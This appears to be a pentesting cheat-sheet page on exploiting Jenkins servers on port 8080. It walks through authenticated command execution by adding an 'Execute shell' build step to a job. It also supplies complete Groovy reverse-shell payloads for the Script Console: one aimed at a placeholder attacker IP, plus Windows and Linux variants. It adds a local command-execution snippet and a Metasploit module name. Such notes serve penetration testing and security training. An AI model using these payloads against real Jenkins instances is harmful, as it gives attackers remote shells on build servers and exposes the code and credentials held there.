# 8080 - Jenkins

## Exploitation

### Basic command execution (Authenticated)

* &#x20;Press 'Create a job'
* Choose a name and  Create new freestyle project&#x20;
* In the `build` section press `Execute shell`
* Enter the command you would like (based on OS)
* Press 'Save'
* On the project dashboard go to `Build now`
* Press the newly created number under 'Build History'
* Press `Console houtput`
* See output of the command.
* To execute a different command press 'back to project' and then 'configure'



### Groovy Script

Jenkins features a nice Groovy script console which allows one to run arbitrary Groovy scripts within the Jenkins master runtime or in the runtime on agents.

Specially crafted script written in groovy to make a reverse shell

> String host="{your\_IP}"; int port=8000; String cmd="/bin/bash"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){\}};p.destroy();s.close();

#### Reverse Shell from the web interface

At Jenkins Dashboard go to `Manage Jenkins` and then select `Script Console`, run the following code for reverse shell:

For windows:

```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

#### Linux:

```
String host="localhost";
int port=8044;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

#### Executing commands local:

```
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'ipconfig'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

#### Metasploit

uses the Jenkins-CI Groovy script console to execute OS commands using Java:

```
use exploit/multi/http/jenkins_script_console
```
